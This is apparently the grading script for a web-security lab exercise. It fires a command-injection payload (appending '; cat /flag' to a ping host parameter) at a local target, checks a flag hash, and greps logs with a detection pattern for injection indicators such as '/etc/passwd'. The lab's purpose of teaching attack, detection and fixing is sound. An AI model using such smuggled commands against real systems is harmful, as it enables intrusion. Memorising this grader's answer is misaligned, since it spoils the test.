#!/usr/bin/env bash
# Objective grading for web-02. Two checks:
#   1. RED  — command injection reads /flag off the server
#   2. BLUE — the detection fires on the injection payload in the logs
# Exits non-zero on FAIL.
set -uo pipefail

TARGET="${TARGET:-http://127.0.0.1:8080}"
EXPECTED_SHA="d5afae700fb28be0a021b35d99df3dc1cfd03d6d8ca48d061105dbebe8addeb1"
LOGFILE="/var/log/app/access.log"
pass=1

sha256() { shasum -a 256 2>/dev/null | awk '{print $1}' || sha256sum | awk '{print $1}'; }

echo "== Check 1: command injection reads the flag (red) =="
RESP=$(curl -s -G "$TARGET/ping" --data-urlencode "host=127.0.0.1; cat /flag" || true)
FLAG=$(printf '%s' "$RESP" | grep -o 'HND{[^}]*}' | head -1)
GOT_SHA=$(printf '%s' "$FLAG" | sha256)
if [ "$GOT_SHA" = "$EXPECTED_SHA" ]; then
  echo "  [PASS] injection executed and returned the flag"
else
  echo "  [FAIL] no flag via injection (patched target, or app down?)"
  pass=0
fi

echo "== Check 2: detection fires (blue) =="
HITS=$(docker compose exec -T target grep -Eic ';|\||&&|\$\(|`|cat |whoami|/etc/passwd' "$LOGFILE" 2>/dev/null || echo 0)
if [ "${HITS:-0}" -gt 0 ]; then
  echo "  [PASS] detection matched $HITS command-injection indicator(s)"
else
  echo "  [FAIL] detection found nothing — run 'make attack' first"
  pass=0
fi

echo "--------------------------------------------"
if [ "$pass" -eq 1 ]; then
  echo "PASS — you got command execution AND you can detect it. On to the fix."
  exit 0
else
  echo "FAIL"
  exit 1
fi
